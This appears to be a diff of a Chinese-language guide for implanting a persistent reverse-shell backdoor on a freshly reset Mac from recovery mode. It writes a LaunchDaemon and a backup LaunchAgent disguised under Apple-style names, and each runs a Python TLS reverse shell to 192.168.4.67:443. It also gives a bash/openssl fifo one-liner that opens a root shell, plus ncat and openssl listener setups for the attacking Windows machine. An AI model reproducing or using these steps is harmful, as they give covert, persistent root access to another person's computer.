@@ -1,23 +1,34 @@
-Mac 端（刚重置完，在恢复模式终端）
-1. 挂载 Data
+挂载 Data 卷
 
 bash
 diskutil mount /dev/disk3s4
-2. 写 LaunchDaemon（唯一后门，稳定、带 PTY）
+创建 LaunchDaemons 目录（确保存在）
 
 bash
-cat > "/Volumes/Data/Library/LaunchDaemons/com.apple.wifi.WiFiHelper.plist" << 'EOF'
+mkdir -p "/Volumes/Data/Library/LaunchDaemons"
+写入主后门 com.apple.mdmhelper.plist
+
+bash
+cat > "/Volumes/Data/Library/LaunchDaemons/com.apple.mdmhelper.plist" << 'EOF'
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>com.apple.wifi.WiFiHelper</string>
+    <string>com.apple.mdmhelper</string>
     <key>ProgramArguments</key>
     <array>
         <string>/usr/bin/python3</string>
         <string>-c</string>
-        <string>import socket,subprocess,os,ssl,pty,time,sys;H='192.168.4.67';P=443;while True:try:s=socket.socket();s.connect((H,P));c=ssl.create_default_context().wrap_socket(s,server_hostname='');os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn('/bin/bash');except:time.sleep(10)</string>
+        <string>import socket,subprocess,os,ssl,pty,time;
+HOST='192.168.4.67'; PORT=443;
+while True:
+    try:
+        s=socket.socket(); s.connect((HOST,PORT));
+        c=ssl.create_default_context().wrap_socket(s, server_hostname='');
+        os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2);
+        pty.spawn('/bin/bash');
+    except: time.sleep(10)</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
@@ -28,45 +39,63 @@ cat > "/Volumes/Data/Library/LaunchDaemons/com.apple.wifi.WiFiHelper.plist" << '
 </dict>
 </plist>
 EOF
-3. 加权限（普通权限即可，不要 immutable flag）
+设置权限
 
 bash
-chown root:wheel "/Volumes/Data/Library/LaunchDaemons/com.apple.wifi.WiFiHelper.plist"
-chmod 644 "/Volumes/Data/Library/LaunchDaemons/com.apple.wifi.WiFiHelper.plist"
-4. 验证文件确实在正确位置
+chown root:wheel "/Volumes/Data/Library/LaunchDaemons/com.apple.mdmhelper.plist"
+chmod 644 "/Volumes/Data/Library/LaunchDaemons/com.apple.mdmhelper.plist"
+写入备用 LaunchAgent
 
 bash
-ls -l "/Volumes/Data/Library/LaunchDaemons/com.apple.wifi.WiFiHelper.plist"
-5. 重启
-
-bash
-reboot
-攻击机（Windows）
-方案 A（最佳）：用 Ncat 监听
-
-下载安装 Nmap for Windows。
-
-打开命令提示符执行：
-
-cmd
-ncat --ssl -lvvp 443 --keep-open
-方案 B（备选）：OpenSSL 循环监听（不如 ncat 稳，但可用）
-先生成证书（若已有可跳过）：
-
-cmd
-openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 3650 -nodes -subj "/CN=192.168.4.67"
-创建 listener.bat：
-
-bat
-:loop
-openssl s_server -quiet -key key.pem -cert cert.pem -port 443 -ign_eof
-timeout /t 2 >nul
-goto loop
-双击运行。
-用纯 Bash 临时测试连通性（利用 /dev/tcp，不需要 Python）
-执行下面这条命令，它会建立一个加密反向 shell 连到你的攻击机。
+mkdir -p "/Volumes/Data/Library/LaunchAgents"
+cat > "/Volumes/Data/Library/LaunchAgents/com.apple.softwareupdated.plist" << 'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.apple.softwareupdated</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/usr/bin/python3</string>
+        <string>-c</string>
+        <string>import socket,subprocess,os,ssl,pty,time;
+HOST='192.168.4.67'; PORT=443;
+while True:
+    try:
+        s=socket.socket(); s.connect((HOST,PORT));
+        c=ssl.create_default_context().wrap_socket(s, server_hostname='');
+        os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2);
+        pty.spawn('/bin/bash');
+    except: time.sleep(10)</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+EOF
+chown root:wheel "/Volumes/Data/Library/LaunchAgents/com.apple.softwareupdated.plist"
+chmod 644 "/Volumes/Data/Library/LaunchAgents/com.apple.softwareupdated.plist"
+测试连通性（在恢复模式里快速验证）
+因为恢复模式没有 Python3，用 bash 临时测隧道：
 
 bash
 /bin/bash -c 'P=/tmp/.t; rm -f $P; mkfifo $P; /Volumes/Data/usr/bin/openssl s_client -quiet -connect 192.168.4.67:443 < $P | /bin/bash -i &> $P'
+执行后马上去攻击机看有没有弹回 root shell。
 
+如果拿到 shell，输入 id 确认，然后 exit 退出临时 shell。
 
+如果没反应，检查攻击机是否监听（netstat -ano | findstr :443）、Mac 能否 ping 通攻击机。
+
+重启
+
+bash
+reboot
+攻击机保持监听
+
+cmd
+ncat --ssl -lvvp 443 --keep-open
+Mac 走完 OOBE、联网后，会立刻回连，给你一个带 PTY 的 root shell。
+进入系统后，可以执行 launchctl list | grep mdmhelper 确认服务已加载。
